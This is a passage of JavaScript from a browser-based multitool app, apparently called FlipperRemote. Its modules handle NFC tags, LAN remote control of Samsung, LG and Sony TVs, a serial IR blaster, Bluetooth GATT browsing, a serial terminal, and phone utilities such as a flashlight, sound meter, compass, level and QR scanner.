        if(rec.recordType==='text'||rec.recordType==='url'){
          data=new TextDecoder(rec.encoding||'utf-8').decode(rec.data);break;
        }else{data='['+rec.recordType+']';break}
      }
      S.nfcTag={uid:serialNumber,type:type||'NDEF',data:data||'No data'};
      S.nfcActive=false;
      T('TAG READ!');vib([60,20,60]);lp('G',700);addLog('NFC','UID:'+serialNumber);rNFC();
    });
    r.addEventListener('readingerror',()=>{S.nfcActive=false;T('NFC READ ERROR');rNFC()});
  }catch(e){
    S.nfcActive=false;
    if(e.name!=='AbortError')T('NFC: '+e.message.slice(0,14));
    rNFC();
  }
}
async function nfcWrite(){
  if(!('NDEFReader' in window)){T('NO NFC');return}
  const msg=prompt('Text to write to NFC tag:');
  if(!msg)return;
  try{
    const r=new NDEFReader();
    await r.write({records:[{recordType:'text',data:msg}]});
    T('WRITTEN!');vib([40,20,40]);
  }catch(e){T('WRITE: '+e.message.slice(0,14))}
}

/* ================================================
   6. SAMSUNG TV
================================================ */
const SAM={
  power:'KEY_POWER',vUp:'KEY_VOLUMEUP',vDn:'KEY_VOLUMEDOWN',
  mute:'KEY_MUTE',chUp:'KEY_CHANNELUP',chDn:'KEY_CHANNELDOWN',
  up:'KEY_UP',dn:'KEY_DOWN',lt:'KEY_LEFT',rt:'KEY_RIGHT',
  ok:'KEY_ENTER',back:'KEY_RETURN',home:'KEY_HOME',
  menu:'KEY_MENU',source:'KEY_SOURCE'
};
function appSam(){
  rSam();clearCtx();
  btn('CONNECT',samConnect,'cg');
  btn('POWER',()=>samKey('power'),'cr');
  btn('VOL+',()=>samKey('vUp'),'');
  btn('VOL-',()=>samKey('vDn'),'');
  btn('CH+',()=>samKey('chUp'),'');
  btn('CH-',()=>samKey('chDn'),'');
  btn('HOME',()=>samKey('home'),'co');
  btn('MUTE',()=>samKey('mute'),'cy');
  btn('SOURCE',()=>samKey('source'),'');
  _H={up:()=>samKey('up'),dn:()=>samKey('dn'),lt:()=>samKey('lt'),rt:()=>samKey('rt'),ok:()=>samKey('ok'),sU:()=>samKey('vUp'),sD:()=>samKey('vDn')};
}
function rSam(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">${S.samOk?'<span class="bl">[>]</span> '+S.samIp:'[>] '+(S.samIp||'NOT SET')}</div>
    <div class="sl">${S.samOk?'[CONNECTED]':'[DISCONNECTED]'}</div>
    <div class="hr"></div>
    <div class="sl d">Port 8001 - SmartThings WS</div>
    <div class="sl d">Requires HTTP (not HTTPS)</div>
    ${S.samOk?'<div class="sl y">[WS ACTIVE]</div>':'<div class="sl d">Enter TV IP to connect</div>'}
  </div>`;
}
async function samConnect(){
  const ip=(S.samIp||prompt('Samsung TV IP (e.g. 192.168.1.10):'))?.trim();
  if(!ip)return;
  S.samIp=ip;localStorage.setItem('sam_ip',ip);
  if(isHttps()){T('NEEDS HTTP MODE');return}
  if(S.samWs){try{S.samWs.close()}catch(e){}}
  T('CONNECTING...');startLoad(3500);
  S.samWs=new WebSocket(`ws://${ip}:8001/api/v2/channels/samsung.remote.control?name=${btoa('FlipperRemote')}`);
  S.samWs.onopen=()=>{S.samOk=true;T('SAMSUNG CONNECTED!');addLog('Sam','OK '+ip);vib([40,20,40]);lp('G',600);rSam()};
  S.samWs.onclose=()=>{S.samOk=false;if(S.app==='samsung')rSam()};
  S.samWs.onerror=()=>{S.samOk=false;T('CONNECT FAILED');if(S.app==='samsung')rSam()};
}
function samKey(k){
  flashIR();vib(10);
  if(!S.samOk||S.samWs?.readyState!==1){T('NOT CONNECTED');return}
  S.samWs.send(JSON.stringify({method:'ms.remote.control',params:{Cmd:'Click',DataOfCmd:SAM[k],Option:'false',TypeOfRemote:'SendRemoteKey'}}));
}

/* ================================================
   7. LG TV
================================================ */
const LGU={
  off:'ssap://system/turnOff',vUp:'ssap://audio/volumeUp',
  vDn:'ssap://audio/volumeDown',chUp:'ssap://tv/channelUp',
  chDn:'ssap://tv/channelDown',toast:'ssap://system.notifications/createToast'
};
let lgId=0,lgCb={};
function appLG(){
  rLG();clearCtx();
  btn('CONNECT',lgConnect,'cg');
  btn('POWER OFF',()=>lgSend(LGU.off),'cr');
  btn('VOL+',()=>lgSend(LGU.vUp),'');
  btn('VOL-',()=>lgSend(LGU.vDn),'');
  btn('CH+',()=>lgSend(LGU.chUp),'');
  btn('CH-',()=>lgSend(LGU.chDn),'');
  btn('MSG',()=>lgSend(LGU.toast,{message:'FlipperRemote'}),'co');
  _H={up:()=>lgSend(LGU.vUp),dn:()=>lgSend(LGU.vDn),sU:()=>lgSend(LGU.vUp),sD:()=>lgSend(LGU.vDn)};
}
function rLG(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">${S.lgOk?'<span class="bl">[@]</span> '+S.lgIp:'[@] '+(S.lgIp||'NOT SET')}</div>
    <div class="sl">${S.lgOk?'[CONNECTED]':'[DISCONNECTED]'}</div>
    <div class="hr"></div>
    <div class="sl d">Port 3000 - WebOS WS</div>
    ${S.lgKey?`<div class="sl d">KEY: ...${S.lgKey.slice(-8)}</div>`:'<div class="sl d">Will pair on TV screen</div>'}
  </div>`;
}
async function lgConnect(){
  const ip=(S.lgIp||prompt('LG TV IP:'))?.trim();if(!ip)return;
  S.lgIp=ip;localStorage.setItem('lg_ip',ip);
  if(isHttps()){T('NEEDS HTTP');return}
  if(S.lgWs){try{S.lgWs.close()}catch(e){}}
  T('CONNECTING...');startLoad(3500);
  S.lgWs=new WebSocket(`ws://${ip}:3000/`);
  S.lgWs.onopen=()=>lgReg();
  S.lgWs.onclose=()=>{S.lgOk=false;if(S.app==='lg')rLG()};
  S.lgWs.onerror=()=>{S.lgOk=false;T('LG FAILED');if(S.app==='lg')rLG()};
  S.lgWs.onmessage=e=>{
    try{
      const d=JSON.parse(e.data);
      if(d.type==='registered'){
        S.lgOk=true;S.lgKey=d.payload?.['client-key']||S.lgKey;
        localStorage.setItem('lg_key',S.lgKey);
        T('LG CONNECTED!');vib([40,20,40]);lp('G',600);rLG();
      }
      if(d.id&&lgCb[d.id]){lgCb[d.id](d.payload);delete lgCb[d.id]}
    }catch(e){}
  };
}
function lgReg(){
  S.lgWs.send(JSON.stringify({type:'register',id:'reg0',payload:{forcePairing:false,pairingType:'PROMPT','client-key':S.lgKey||undefined,manifest:{manifestVersion:1,appVersion:'1.1',signed:{created:'20140509',appId:'com.flipperremote',vendorId:'flipper',localizedAppNames:{'':'FlipperRemote'},localizedVendorNames:{'':'FlipperRemote'},permissions:['CONTROL_POWER','CONTROL_AUDIO','TURN_OFF'],serial:'FR51'},permissions:['CONTROL_POWER','CONTROL_AUDIO','TURN_OFF'],signatures:[{signatureVersion:1,signature:'UNSIGNED'}]}}}));
}
function lgSend(uri,payload={},cb){
  if(!S.lgOk||!S.lgWs){T('LG NOT CONNECTED');return}
  const id='fr'+(++lgId);
  if(cb)lgCb[id]=cb;
  S.lgWs.send(JSON.stringify({type:'request',id,uri,payload}));
  flashIR();vib(10);
}

/* ================================================
   8. SONY TV
================================================ */
function appSony(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">[+] SONY BRAVIA</div>
    <div class="sl">IP: ${S.sonyIp||'not set'}</div>
    <div class="sl d">PSK: ${S.sonyPsk}</div>
    <div class="hr"></div>
    <div class="sl d">TV Settings > Remote Start ON</div>
    <div class="hr"></div>
    <div class="sl ${isHttps()?'r':'h'}">${isHttps()?'[!] Run via HTTP only':'[OK] HTTP MODE OK'}</div>
  </div>`;
  clearCtx();
  btn('POWER OFF',sonyOff,'cr');
  btn('POWER ON',sonyOn,'cg');
  btn('VOL+',()=>sonyA('setAudioVolume',{volume:'+1',target:'speaker'}),'');
  btn('VOL-',()=>sonyA('setAudioVolume',{volume:'-1',target:'speaker'}),'');
  btn('INFO',sonyInfo,'co');
  btn('SET IP',()=>{const ip=prompt('Sony IP:','')?.trim();if(ip){S.sonyIp=ip;localStorage.setItem('sony_ip',ip);openApp('sony')}},'');
  _H={sU:()=>sonyA('setAudioVolume',{volume:'+1'}),sD:()=>sonyA('setAudioVolume',{volume:'-1'})};
}
async function sonyReq(svc,method,params=[]){
  const ip=S.sonyIp||prompt('Sony IP:')?.trim();
  if(!ip)return null;S.sonyIp=ip;
  if(isHttps())return null;
  try{
    const r=await fetch(`http://${ip}/sony/${svc}`,{method:'POST',headers:{'Content-Type':'application/json','X-Auth-PSK':S.sonyPsk},body:JSON.stringify({method,id:1,params,version:'1.0'})});
    return await r.json();
  }catch(e){T('SONY ERR');return null}
}
async function sonyOff(){flashIR();vib(30);const d=await sonyReq('system','setPowerStatus',[{status:false}]);if(d&&!d.error)T('POWER OFF')}
async function sonyOn(){flashIR();vib(30);const d=await sonyReq('system','setPowerStatus',[{status:true}]);if(d&&!d.error)T('POWER ON')}
async function sonyA(m,p){flashIR();vib(10);await sonyReq('audio',m,[p])}
async function sonyInfo(){const d=await sonyReq('system','getSystemInformation',[]);if(d?.result?.[0])T((d.result[0].model||'Sony').slice(0,20))}

/* ================================================
   9. IR BLASTER
================================================ */
function appIR(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">[-] IR BLASTER</div>
    <div class="sl">${S.port?'[SERIAL OK]':'[NO SERIAL]'}</div>
    <div class="hr"></div>
    <div class="sl d">Needs: Arduino + IR LED</div>
    <div class="sl d">Pin 9 + 100ohm + IRremote</div>
    <div class="hr"></div>
    <div class="sl ${'serial' in navigator?'h':'r'}">${'serial' in navigator?'[OK] Web Serial OK':'[!] Chrome desktop only'}</div>
  </div>`;
  clearCtx();
  btn('CONNECT',async()=>{
    if(!('serial' in navigator)){T('CHROME DESKTOP REQUIRED');return}
    try{
      S.port=await navigator.serial.requestPort();
      await S.port.open({baudRate:9600});
      const enc=new TextEncoderStream();
      enc.readable.pipeTo(S.port.writable);
      S.portWriter=enc.writable.getWriter();
      T('SERIAL CONNECTED!');lp('G',600);openApp('ir');
    }catch(e){T('ERR: '+e.message.slice(0,14))}
  },'cg');
  btn('POWER',()=>irSend('POWER'),'cr');
  btn('VOL+',()=>irSend('VOLU'),'');
  btn('VOL-',()=>irSend('VOLD'),'');
  btn('CH+',()=>irSend('CHU'),'');
  btn('CH-',()=>irSend('CHD'),'');
  btn('MUTE',()=>irSend('MUTE'),'cy');
  _H={sU:()=>irSend('VOLU'),sD:()=>irSend('VOLD'),ok:()=>irSend('POWER')};
}
async function irSend(cmd){
  flashIR();vib(12);
  if(S.portWriter){
    try{await S.portWriter.write(cmd+'\n');T('IR: '+cmd)}
    catch(e){T('SEND FAILED')}
  }else T('CONNECT SERIAL FIRST');
}

/* ================================================
   10. BT CONNECT — GATT pairing
================================================ */
function appBT(){
  rBT();clearCtx();
  btn('SCAN',btScan,'cg');
  btn('CONNECT',btConn,'co');
  btn('BATTERY',btBatt,'cy');
  btn('HR',btHR,'cb2');
  btn('DISC',btDisc,'cr');
  _H={up:()=>{S.btSel=Math.max(0,S.btSel-1);rBT()},dn:()=>{S.btSel=Math.min(S.btDevs.length-1,S.btSel+1);rBT()},ok:btConn};
}
function rBT(){
  const lst=S.btDevs.length
    ?S.btDevs.slice(0,6).map((d,i)=>`<div class="mi${i===S.btSel?' s':''}" onclick="S.btSel=${i};rBT()">
        <span class="ic">[B]</span>
        <span style="flex:1;margin-left:3px">${(d.alias||d.name).slice(0,14)}</span>
        ${d.connected?'<span class="bt-badge ok">ON</span>':''}
      </div>`).join('')
    :'<div class="sl d">> Press SCAN</div>';
  const st=S.btDev
    ?`<div class="sl h"><span class="bl">[B]</span> ${(S.btDev.alias||S.btDev.name).slice(0,16)}</div><div class="sl d">GATT: ${S.btGatt?.connected?'OPEN':'CLOSED'}</div>`
    :'<div class="sl d">No device connected</div>';
  scr.innerHTML=`<div class="fi">${st}<div class="hr"></div>${lst}</div>`;
  $('sBt').classList.toggle('on',!!S.btDev&&S.btGatt?.connected);
}
async function btScan(){
  if(!navigator.bluetooth){T('WEB BT NOT SUPPORTED');return}
  try{
    const dev=await navigator.bluetooth.requestDevice({acceptAllDevices:true,optionalServices:['battery_service','heart_rate','generic_access']});
    const existing=S.btDevs.findIndex(d=>d.id===dev.id);
    const entry={id:dev.id,name:dev.name||'Unknown',alias:null,device:dev,connected:false};
    if(existing===-1){S.btDevs.push(entry);S.btSel=S.btDevs.length-1}
    else{S.btDevs[existing].device=dev;S.btSel=existing}
    dev.addEventListener('gattserverdisconnected',()=>{
      const idx=S.btDevs.findIndex(d=>d.id===dev.id);
      if(idx!==-1)S.btDevs[idx].connected=false;
      if(S.btDev?.id===dev.id){S.btGatt=null;lp('R',600)}
      if(S.app==='bt_connect')rBT();
      T('BT DISCONNECTED');
    });
    T('FOUND: '+(dev.name||'?').slice(0,14));vib([30,10,30]);lp('G',400);rBT();
  }catch(e){if(e.name!=='NotFoundError')T('BT: '+e.message.slice(0,14))}
}
async function btConn(){
  const d=S.btDevs[S.btSel];
  if(!d){T('SELECT DEVICE FIRST');return}
  T('CONNECTING...');startLoad(4000);
  try{
    S.btGatt=await d.device.gatt.connect();
    S.btDev=d;d.connected=true;
    T('CONNECTED!');vib([40,20,40]);lp('G',600);addLog('BT','Connected: '+d.name);rBT();
  }catch(e){T('GATT FAILED');d.connected=false;rBT()}
}
async function btBatt(){
  if(!S.btGatt?.connected){T('CONNECT FIRST');return}
  try{
    const s=await S.btGatt.getPrimaryService('battery_service');
    const c=await s.getCharacteristic('battery_level');
    const v=await c.readValue();
    T('BATTERY: '+v.getUint8(0)+'%');
  }catch(e){T('NO BATTERY SVC')}
}
async function btHR(){
  if(!S.btGatt?.connected){T('CONNECT FIRST');return}
  try{
    const s=await S.btGatt.getPrimaryService('heart_rate');
    const c=await s.getCharacteristic('heart_rate_measurement');
    await c.startNotifications();
    c.addEventListener('characteristicvaluechanged',e=>{T('HR: '+e.target.value.getUint8(1)+' BPM')});
    T('HR MONITOR ON');
  }catch(e){T('NO HR SERVICE')}
}
function btDisc(){
  try{S.btGatt?.disconnect()}catch(e){}
  if(S.btDev){const idx=S.btDevs.findIndex(d=>d.id===S.btDev.id);if(idx!==-1)S.btDevs[idx].connected=false}
  S.btDev=null;S.btGatt=null;rBT();T('DISCONNECTED');
}

/* ================================================
   11. BT GATT BROWSER
   Connect and explore all services + characteristics
================================================ */
function appBTPair(){
  let services=[];let connected=false;let devName='';
  let gatt=null;

  const render=()=>{
    const svcRows=services.map(svc=>{
      const chrRows=svc.chars.map(c=>`
        <div class="gatt-row" style="padding-left:10px;font-size:4.5px;color:#888">
          CHR: ${c.uuid.slice(0,8)}..
          <span style="color:#FF9500;margin-left:3px">${c.props.join(' ')}</span>
          ${c.value?`<div style="color:#FF9500;font-size:4px;padding-left:4px">VAL: ${c.value}</div>`:''}
        </div>`).join('');
      return `<div class="gatt-row svc">SVC: ${svc.uuid.slice(0,8)}.. (${svc.chars.length} chr)</div>${chrRows}`;
    }).join('');

    scr.innerHTML=`<div class="fi sl2" style="height:100%">
      <div style="display:flex;justify-content:space-between">
        <span class="sl h">BT GATT BROWSER</span>
        <span class="sl d" style="font-size:4.5px">${connected?'<span class="bl">[ON]</span>':'[OFF]'}</span>
      </div>
      <div class="sl d">${devName||'No device'}</div>
      <div class="hr"></div>
      ${services.length
        ?svcRows
        :'<div class="sl d">> Connect to browse GATT services</div><div class="sl d">> Reads all characteristics</div>'
      }
    </div>`;
  };

  render();clearCtx();

  btn('PAIR',async()=>{
    if(!navigator.bluetooth){T('WEB BT NOT SUPPORTED');return}
    T('REQUESTING DEVICE...');
    try{
      const dev=await navigator.bluetooth.requestDevice({
        acceptAllDevices:true,
        optionalServices:[
          'battery_service','heart_rate','generic_access',
          'generic_attribute','device_information',
          '0000180a-0000-1000-8000-00805f9b34fb',
          '0000180f-0000-1000-8000-00805f9b34fb',
        ]
      });
      devName=dev.name||'Unknown Device';
      T('CONNECTING GATT...');startLoad(5000);
      gatt=await dev.gatt.connect();
      connected=true;services=[];
      lp('G',600);vib([40,20,40]);
      addLog('BT','GATT: '+devName);

      const rawSvcs=await gatt.getPrimaryServices();
      for(const svc of rawSvcs){
        const chars=[];
        try{
          const rawChrs=await svc.getCharacteristics();
          for(const chr of rawChrs){
            const props=[];
            if(chr.properties.read)props.push('R');
            if(chr.properties.write)props.push('W');
            if(chr.properties.notify)props.push('N');
            if(chr.properties.indicate)props.push('I');
            let value='';
            if(chr.properties.read){
              try{const v=await chr.readValue();value=Array.from(new Uint8Array(v.buffer)).map(b=>b.toString(16).padStart(2,'0')).join(' ')}catch(e){}
            }
            chars.push({uuid:chr.uuid,props,value});
          }
        }catch(e){}
        services.push({uuid:svc.uuid,chars});
      }
      T('GATT OK - '+services.length+' SVC');
      render();
      dev.addEventListener('gattserverdisconnected',()=>{connected=false;gatt=null;T('BT DISCONNECTED');render()});
    }catch(e){
      connected=false;
      if(e.name!=='NotFoundError')T('ERR: '+e.message.slice(0,18));
      render();
    }
  },'cg');

  btn('DISC',()=>{
    try{gatt?.disconnect()}catch(e){}
    connected=false;gatt=null;services=[];devName='';render();T('DISCONNECTED');
  },'cr');

  btn('EXPORT',()=>{
    if(!services.length){T('NOTHING TO EXPORT');return}
    const out=services.map(s=>`SVC: ${s.uuid}\n`+s.chars.map(c=>`  CHR: ${c.uuid} [${c.props.join('')}]${c.value?' = '+c.value:''}`).join('\n')).join('\n\n');
    navigator.clipboard?.writeText(out).then(()=>T('GATT DATA COPIED!'));
  },'co');

  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   12. SERIAL TERMINAL
================================================ */
function appSerialTerm(){
  let writer=null;let lines=[];
  const append=txt=>{lines.push(txt);if(lines.length>30)lines.shift();renderLines()};
  const renderLines=()=>{
    const el=$('stOut');
    if(el)el.innerHTML=lines.map(l=>`<div class="term">${l}</div>`).join('');
    if(el)el.scrollTop=9999;
  };

  scr.innerHTML=`<div class="fi" style="height:100%">
    <div style="display:flex;justify-content:space-between">
      <span class="sl h">SERIAL TERM</span>
      <span class="sl d" style="font-size:4.5px" id="stSt">[DISC]</span>
    </div>
    <div class="hr"></div>
    <div id="stOut" style="flex:1;overflow-y:auto;height:calc(100% - 32px);padding:2px 0;scrollbar-width:none"></div>
  </div>`;

  clearCtx();

  btn('CONNECT',async()=>{
    if(!('serial' in navigator)){T('CHROME DESKTOP ONLY');return}
    try{
      const port=await navigator.serial.requestPort();
      const baud=parseInt(prompt('Baud rate:','115200')||'115200');
      await port.open({baudRate:baud});
      S.port=port;
      const st=$('stSt');if(st)st.textContent='['+baud+']';
      const enc=new TextEncoderStream();
      enc.readable.pipeTo(port.writable);
      writer=enc.writable.getWriter();
      S.portWriter=writer;
      // Read loop
      const reader=port.readable.getReader();
      const dec=new TextDecoder();
      let buf='';
      (async()=>{
        try{
          while(true){
            const {value,done}=await reader.read();
            if(done)break;
            buf+=dec.decode(value);
            const parts=buf.split('\n');
            buf=parts.pop();
            parts.forEach(l=>append(l));
          }
        }catch(e){}
      })();
      T('CONNECTED @ '+baud);lp('G',600);append('> connected @ '+baud+' baud');
    }catch(e){T('ERR: '+e.message.slice(0,18))}
  },'cg');

  btn('SEND',async()=>{
    if(!writer){T('CONNECT FIRST');return}
    const msg=prompt('Send string:');
    if(!msg)return;
    try{await writer.write(msg+'\r\n');append('< '+msg);lp('O',150)}
    catch(e){T('WRITE ERR')}
  },'co');

  btn('BLINK',async()=>{
    if(!writer){T('CONNECT FIRST');return}
    for(let i=0;i<5;i++){
      await new Promise(r=>setTimeout(r,200));
      await writer.write('BLINK\r\n').catch(()=>{});
    }
    T('BLINK SENT x5');
  },'cy');

  btn('CLEAR',()=>{lines=[];renderLines()},'');

  btn('DISC',async()=>{
    try{if(S.port){await S.port.close();S.port=null}}catch(e){}
    writer=null;S.portWriter=null;
    const st=$('stSt');if(st)st.textContent='[DISC]';
    append('> disconnected');T('DISCONNECTED');
  },'cr');

  _H={ok:()=>document.querySelector('.cb.co')?.click()};
}

/* ================================================
   13. FLASHLIGHT
================================================ */
function appFlashlight(){
  let torchOn=false,screenOn=false,strobeInt=null,_ftStream=null;
  const render=()=>{
    scr.innerHTML=`<div class="fi" style="text-align:center">
      <div class="sl h">FLASHLIGHT</div>
      <div class="hr"></div>
      <div class="sl d">TORCH: ${torchOn?'<span style="color:var(--fl)">[ON]</span>':'[OFF]'}</div>
      <div class="sl d">SCREEN: ${screenOn?'<span style="color:var(--fl)">[WHITE]</span>':'[OFF]'}</div>
    </div>`;
  };
  render();clearCtx();
  btn('TORCH',async()=>{
    try{
      if(!_ftStream){_ftStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});window._camStream=_ftStream}
      const track=_ftStream.getVideoTracks()[0];
      const caps=track.getCapabilities();
      if(!caps.torch){T('NO TORCH ON THIS DEVICE');return}
      torchOn=!torchOn;
      await track.applyConstraints({advanced:[{torch:torchOn}]});
      lp(torchOn?'O':'G',300);render();T('TORCH '+(torchOn?'ON':'OFF'));
    }catch(e){T('CAM ERR: '+e.message.slice(0,14))}
  },'cy');
  btn('SCREEN',()=>{
    if(strobeInt){clearInterval(strobeInt);strobeInt=null}
    screenOn=!screenOn;
    const existing=document.querySelector('.clr-screen');
    if(screenOn){
      const ov=document.createElement('div');
      ov.className='clr-screen';ov.style.background='#ffffff';ov.style.color='#000';
      ov.innerHTML='<span style="font-family:var(--px);font-size:8px">TAP TO CLOSE</span>';
      ov.onclick=()=>{ov.remove();screenOn=false;render()};
      document.querySelector('.screen').appendChild(ov);
    }else{existing?.remove()}
    render();
  },'cg');
  btn('STROBE',()=>{
    if(strobeInt){clearInterval(strobeInt);strobeInt=null;document.querySelector('.clr-screen')?.remove();T('STROBE OFF');render();return}
    const s=document.querySelector('.screen');let on=false;
    strobeInt=setInterval(()=>{
      document.querySelector('.clr-screen')?.remove();
      if(on){const ov=document.createElement('div');ov.className='clr-screen';ov.style.background='#ffffff';s.appendChild(ov)}
      on=!on;vib(4);
    },80);
    T('STROBE ON!');
  },'cp');
  btn('SOS',()=>{
    const morse=[3,1,3,1,3,2,1,1,1,1,1,1,3,1,3,1,3];let i=0;
    const s=document.querySelector('.screen');
    const next=()=>{
      if(i>=morse.length){i=0;setTimeout(next,800);return}
      const d=morse[i]*150;
      const ov=document.createElement('div');ov.className='clr-screen';ov.style.background='#FF2233';
      s.appendChild(ov);vib(d);
      setTimeout(()=>{ov.remove();i++;setTimeout(next,80)},d);
    };
    document.querySelector('.clr-screen')?.remove();next();T('SOS SIGNAL');
  },'cr');
}

/* ================================================
   14. SOUND METER
================================================ */
function appSound(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">SOUND METER</div>
    <div class="hr"></div>
    <canvas id="sCvs" class="vz"></canvas>
    <div class="sl d" id="sDb">LEVEL: ---</div>
    <div class="sl d" id="sPk">PEAK:  ---</div>
    <div id="sRank" class="sl" style="text-align:center;margin-top:3px"></div>
  </div>`;
  clearCtx();
  btn('START',soundStart,'cg');btn('STOP',soundStop,'cr');
  btn('HOLD',()=>{window._sHold=!window._sHold;T(window._sHold?'PEAK HOLD':'HOLD OFF')},'cy');
  btn('RESET',()=>{window._sPeak=-100},'');
  _H={ok:soundStart};
}
window._sPeak=-100;window._sHold=false;
async function soundStart(){
  soundStop();
  try{
    const stream=await navigator.mediaDevices.getUserMedia({audio:{noiseSuppression:false,autoGainControl:false},video:false});
    S.audioCtx=new(window.AudioContext||window.webkitAudioContext)();
    S.analyser=S.audioCtx.createAnalyser();
    S.analyser.fftSize=256;S.analyser.smoothingTimeConstant=0.65;
    S.audioCtx.createMediaStreamSource(stream).connect(S.analyser);
    window._sPeak=-100;
    const draw=()=>{
      if(!S.analyser)return;
      S.vRaf=requestAnimationFrame(draw);
      const c=document.getElementById('sCvs');if(!c)return;
      const cx=c.getContext('2d'),W=c.width=c.offsetWidth,H=c.height=48;
      const freq=new Uint8Array(S.analyser.frequencyBinCount);
      S.analyser.getByteFrequencyData(freq);
      const flt=new Float32Array(S.analyser.frequencyBinCount);
      S.analyser.getFloatFrequencyData(flt);
      const avg=flt.reduce((a,v)=>a+v,0)/flt.length;
      const db=Math.max(-80,Math.min(0,avg));
      if(db>window._sPeak)window._sPeak=db;
      const pct=(db+80)/80,ppct=(window._sPeak+80)/80;
      cx.fillStyle='#020100';cx.fillRect(0,0,W,H);
      for(let i=0;i<32;i++){
        const v=freq[i*2]/255;
        const col=v>.75?'#FF2233':v>.4?'#FF9500':'#FF6B00';
        cx.fillStyle=col+'cc';
        cx.fillRect(i*(W/32),H*(1-v),(W/32)-1.5,H*v);
      }
      cx.fillStyle='#1a0800';cx.fillRect(0,H-6,W,6);
      const g=cx.createLinearGradient(0,0,W,0);
      g.addColorStop(0,'#FF6B00');g.addColorStop(.7,'#FF9500');g.addColorStop(1,'#FF2233');
      cx.fillStyle=g;cx.fillRect(0,H-6,W*pct,6);
      if(window._sHold){cx.fillStyle='#fff';cx.fillRect(W*ppct-1,H-9,2,9)}
      const el=$('sDb');if(el)el.textContent='LEVEL: '+db.toFixed(1)+' dB';
      const ep=$('sPk');if(ep)ep.textContent='PEAK:  '+window._sPeak.toFixed(1)+' dB';
      const rk=$('sRank');if(rk){
        const rank=db>-5?'VERY LOUD':db>-20?'LOUD':db>-40?'NORMAL':db>-60?'QUIET':'SILENT';
        rk.textContent=rank;
      }
    };
    draw();lp('G',300);
  }catch(e){T('MIC: '+e.message.slice(0,16))}
}
function soundStop(){
  if(S.vRaf){cancelAnimationFrame(S.vRaf);S.vRaf=null}
  if(S.audioCtx){S.audioCtx.close().catch(()=>{});S.audioCtx=null;S.analyser=null}
}

/* ================================================
   15. COMPASS
================================================ */
function appCompass(){
  clearCtx();
  btn('ENABLE',async()=>{
    if(typeof DeviceOrientationEvent?.requestPermission==='function'){
      try{await DeviceOrientationEvent.requestPermission();T('COMPASS OK!')}
      catch(e){T('DENIED')}
    }else T('ACTIVE');
  },'cg');
  btn('SHARE',()=>navigator.share?.({title:'Heading',text:`Heading: ${_sx.al} deg`}).catch(()=>{}),'co');
  const draw=()=>{
    window._sRaf=requestAnimationFrame(draw);
    if(S.app!=='compass')return;
    const h=_sx.al;
    const dirs=['N','NE','E','SE','S','SW','W','NW','N'];
    const di=Math.round(h/45)%8;
    scr.innerHTML=`<div class="fi" style="display:flex;flex-direction:column;align-items:center">
      <div class="sl h" style="text-align:center">COMPASS</div>
      <div class="hr"></div>
      <div class="cpw">
        <div class="cpn" style="transform:rotate(${h}deg)"></div>
        <div class="cpl">${dirs[di]}</div>
      </div>
      <div class="bignum" style="font-size:20px;letter-spacing:2px">${String(h).padStart(3,'0')} deg</div>
      <div class="sl d" style="text-align:center">TILT: ${Math.round(Math.sqrt(_sx.be**2+_sx.ga**2))} deg</div>
    </div>`;
  };
  draw();
}

/* ================================================
   16. BUBBLE LEVEL
================================================ */
function appLevel(){
  clearCtx();
  btn('ENABLE',async()=>{
    if(typeof DeviceMotionEvent?.requestPermission==='function'){
      try{await DeviceMotionEvent.requestPermission();T('OK!')}
      catch(e){T('DENIED')}
    }else T('ACTIVE');
  },'cg');
  const draw=()=>{
    window._sRaf=requestAnimationFrame(draw);
    if(S.app!=='level')return;
    const bx=Math.max(-40,Math.min(40,_sx.ga));
    const by=Math.max(-40,Math.min(40,_sx.be-90));
    const tilt=Math.round(Math.sqrt(bx**2+by**2));
    const ok=tilt<3;
    const bxPct=50+bx*(50/40);
    const byPct=50+by*(50/40);
    scr.innerHTML=`<div class="fi" style="display:flex;flex-direction:column;align-items:center">
      <div class="sl h" style="text-align:center">BUBBLE LEVEL</div>
      <div class="hr"></div>
      <div style="position:relative;width:80px;height:80px;border-radius:50%;border:2px solid var(--fgd);margin:4px auto">
        <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:4px;height:4px;border-radius:50%;background:var(--fgd)"></div>
        <div style="position:absolute;width:14px;height:14px;border-radius:50%;background:${ok?'var(--fl)':'var(--fr)'};box-shadow:0 0 ${ok?12:4}px ${ok?'var(--fl)':'var(--fr)'};left:${bxPct}%;top:${byPct}%;transform:translate(-50%,-50%);transition:left .05s,top .05s"></div>
      </div>
      <div class="sl" style="text-align:center;color:${ok?'var(--fl)':'var(--fr)'}">${ok?'[LEVEL]':'[TILT '+tilt+' deg]'}</div>
    </div>`;
  };
  draw();
}

/* ================================================
   17. QR SCANNER
================================================ */
function appQR(){
  scr.innerHTML=`<div class="fi">
    <div class="sl h">QR / BARCODE</div>
    <div class="hr"></div>
    <video id="qrV" style="width:100%;border-radius:3px;display:none" autoplay playsinline muted></video>
    <div class="sl d" id="qrSt">> Press SCAN</div>
    <div id="qrR" style="white-space:normal;word-break:break-all;font-size:5.5px;line-height:1.5;margin-top:2px;position:relative;z-index:2;font-family:var(--px);color:var(--fg)"></div>
  </div>`;
  clearCtx();
  btn('SCAN',qrScan,'cg');btn('STOP',qrStop,'cr');
  btn('OPEN',()=>{if(!window._qrLast){T('SCAN FIRST');return}if(window._qrLast.startsWith('http'))window.open(window._qrLast,'_blank');else T(window._qrLast.slice(0,30))},'co');
  btn('COPY',()=>{if(!window._qrLast){T('SCAN FIRST');return}navigator.clipboard?.writeText(window._qrLast).then(()=>T('COPIED!'))},'cy');
  _H={ok:qrScan};window._qrLast='';
}
async function qrScan(){
  qrStop();
  if(!('BarcodeDetector' in window)){T('NOT SUPPORTED (Android Chrome)');return}
  try{
    window._qrStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280}},audio:false});
    const vid=$('qrV');if(!vid)return;
    vid.srcObject=window._qrStream;vid.style.display='block';
    const s=$('qrSt');if(s)s.textContent='SCANNING...';
    const bd=new BarcodeDetector({formats:['qr_code','ean_13','ean_8','code_128','code_39','upc_a','data_matrix']});
    window._qrInt=setInterval(async()=>{
      if(!vid.videoWidth)return;
      try{
        const codes=await bd.detect(vid);
        if(codes.length){
